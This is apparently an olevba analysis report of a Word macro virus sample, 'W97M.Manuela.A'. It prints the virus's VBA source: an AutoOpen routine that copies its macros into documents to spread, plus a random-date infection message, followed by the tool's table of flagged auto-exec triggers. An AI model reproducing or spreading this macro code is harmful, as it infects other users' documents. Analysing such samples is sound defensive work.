olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Manuiela.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Manuiela.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Manuiela.a - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'****************************************
'* ULTRAS CONSTRUCTION KIT FOR WORD 7.0 *
'*            Version 1.0               *
'****************************************
'Name Macro Virus: "W97M.Manuela.A"
'************************************************************
'* AutoOpen macro                                           *
'************************************************************
Sub AutoOpen()
On Error Resume Next
uCkAo$ = filename$() + ":AutoOpen"
uCkAc$ = "AutoClose"
uCkAx$ = "AutoExec"
uCkAn$ = "AutoNew"
uCkAe$ = "AutoExit"
MacroCopy uCkAc$, uCkAo$
MacroCopy uCkAx$, uCkAo$
MacroCopy uCkAn$, uCkAo$
MacroCopy uCkAe$, uCkAo$
FileSaveAs .Format = 1
MacroCopy uCkAc$, uCkAo$
MacroCopy uCkAx$, uCkAo$
MacroCopy uCkAn$, uCkAo$
MacroCopy uCkAe$, uCkAo$
FileSave
Payload
End Sub
Sub Payload()
U = Int(Rnd() * 30) + 1
If Day(Now()) = U Then
MsgBox ("YOU ARE INFECTED WITH W97M.MANUELA.A VIRUS !!!"), ("IMPORTANT !")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

